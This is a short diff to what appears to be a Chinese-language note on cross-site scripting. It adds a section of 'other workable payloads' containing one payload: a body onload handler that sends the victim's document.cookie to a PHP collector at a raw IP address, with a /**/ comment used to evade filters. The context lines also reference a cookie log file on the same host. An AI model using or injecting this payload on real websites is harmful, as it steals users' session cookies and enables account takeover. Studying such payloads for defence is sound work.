@@ -49,8 +49,11 @@ http://106.53.207.220/cookie.txt
 ````
 
 
+* 其他可行的playload
 
-
+````
+<body/**/onload="document.location.href='http://106.53.207.220/x.php?x='+document.cookie"></body>
+````
 
 
 
